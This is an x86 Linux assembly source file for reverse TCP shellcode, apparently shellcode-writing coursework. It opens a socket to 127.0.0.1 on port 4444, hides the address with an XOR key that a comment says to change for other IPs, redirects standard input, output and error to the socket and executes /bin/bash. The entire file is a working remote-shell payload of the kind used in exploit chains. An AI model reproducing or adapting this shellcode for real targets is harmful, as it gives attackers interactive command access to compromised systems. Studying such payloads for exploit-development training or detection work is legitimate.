; Filename: shell_tcp_reverse.asm
; Author: Simon Lemire / 2018
; Description: Reverse TCP shellcode to 127.0.0.1 on port 4444, executes a shell
; Note: Uses sys_socketcall

global _start

section .text

_start:

	; Zero registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; Create socket
	mov al, 0x66		; sys_socketcall
	mov bl, 0x1			; SYS_SOCKET
	push 0x6			; int protocol -> IPPROTO_TCP
	push 0x1			; int type -> SOCK_STREAM
	push 0x2			; int domain -> AF_INET
	mov ecx, esp
	int 0x80			; sys_socketcall (SYS_SOCKET)
	mov edi, eax		; save socket fd

	; Create addr struct
	mov eax, 0xfeffff80	; 127.0.0.1 XORed
	mov ebx, 0xffffffff	; XOR key (should be changed depending on IP to avoid nulls)
	xor eax, ebx		; 
	push edx			; NULL padding
	push edx			; NULL padding
	push eax			; sin.addr (127.0.0.1)
	push word 0x5c11	; Port 4444
	push word 0x2		; AF_INET
	mov esi, esp

	; Connect socket
	xor eax, eax
	xor ebx, ebx
	mov al, 0x66		; sys_socketcall
	mov bl, 0x3			; SYS_CONNECT
	push 0x10			; socklen_t addrlen
	push esi			; const struct sockaddr *addr
	push edi			; int sockfd
	mov ecx, esp
	int 0x80

	; Redirect STDIN, STDOUT, STDERR to socket
	xor ecx, ecx
	mov cl, 0x3			; counter for loop (stdin to stderr)
	mov ebx, edi		; socket fd

	dup2:
	mov al, 0x3f		; sys_dup2
	dec ecx
	int 0x80			; sys_dup2
	inc ecx
	loop dup2

	; execve()
	xor eax, eax
	push 0x41687361 	; ///bin/bashA
	push 0x622f6e69
	push 0x622f2f2f
	mov byte [esp + 11], al
	mov al, 0xb
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80
